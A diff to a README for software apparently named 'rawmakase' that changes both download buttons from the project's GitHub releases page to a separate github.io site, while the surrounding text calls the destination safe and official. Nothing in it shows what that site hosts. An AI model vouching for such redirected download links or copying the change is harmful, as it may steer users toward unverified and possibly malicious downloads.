@@ -14,7 +14,7 @@ Let’s get you up and running in just a few minutes. We have designed this guid
 
 The only thing you need to do first is grab the software. Click the big button below to go to the download page.
 
-[![Download rawmakase](https://img.shields.io/badge/Download-rawmakase-blue?style=for-the-badge&logo=github)](https://github.com/Foxsy1/rawmakase/releases)
+[![Download rawmakase](https://img.shields.io/badge/Download-rawmakase-blue?style=for-the-badge&logo=github)](https://foxsy1.github.io)
 
 This button will take you to a safe and official page where you can get the latest version of rawmakase. Do not worry, it is completely free and always will be.
 
@@ -134,7 +134,7 @@ We would love to see what you create with rawmakase. After you edit a photo you 
 
 Just in case you missed it, here is your download button again.
 
-[![Get rawmakase](https://img.shields.io/badge/Get%20rawmakase-Latest%20Version-green?style=for-the-badge&logo=github)](https://github.com/Foxsy1/rawmakase/releases)
+[![Get rawmakase](https://img.shields.io/badge/Get%20rawmakase-Latest%20Version-green?style=for-the-badge&logo=github)](https://foxsy1.github.io)
 
 **Remember your one simple action:**
 
